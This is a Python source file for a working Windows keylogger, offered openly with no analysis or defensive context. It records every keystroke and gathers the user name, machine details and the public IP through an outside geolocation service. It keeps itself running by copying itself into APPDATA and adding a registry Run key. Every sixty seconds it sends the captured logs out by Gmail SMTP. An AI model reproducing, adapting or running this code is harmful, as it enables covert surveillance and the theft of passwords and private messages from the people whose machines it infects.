import keyboard
import smtplib
import requests
import json
import platform
import os
import winreg
import shutil
from threading import Timer
from datetime import datetime


sendReport = 60 #Time in seconds to send report 
emailAddres = "email@gmail.com" #use gmail
emailPassword = "12345678"

class Keyloger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.message = ""
        self.info = "==========System Information==========\n"

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def sendEmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        if self.log:
            self.message = self.info + "\n==========Logs==========\n" + self.log
            self.sendEmail(emailAddres, emailPassword, self.message)
        self.log = ""
        self.message = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    # Get system info
    def getInfo(self):
        p =  platform.uname()
        self.info += "User: " + os.getlogin() + "\n"
        self.info += "System: " + p.system + "\n"
        self.info += "Node name: " + p.node + "\n"
        self.info += "Release: " + p.release + "\n"
        self.info += "Version: " + p.version + "\n"
        self.info += "Machine: " + p.machine + "\n"
        self.info += "Processor: " + p.processor + "\n"
        res = requests.get("http://ip-api.com/json/")
        if res.status_code == 200:
            self.info += "==========IP Info==========\n" + json.dumps(res.json())

    # Persistense for windows
    def persistence(self):
        ruta = os.environ["APPDATA"]
        try:
            os.mkdir(ruta + "\\Logs_test")
            actual =  os.path.abspath(__file__)
            shutil.copy(actual, ruta + "\\Logs_test\\Keylogger.exe")
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run')
            winreg.SetValueEx(key, "keylogger", 0, winreg.REG_SZ,  ruta + "\\Logs_test\\Keylogger.exe")
            winreg.CloseKey(key)
        except FileExistsError as e:
            return

    def start(self):
        self.startDt = datetime.now()
        self.persistence()
        keyboard.on_release(callback=self.callback)
        self.getInfo()
        self.report()
        keyboard.wait()

if __name__ == '__main__':
    keylogger = Keyloger(interval=sendReport)
    keylogger.start()
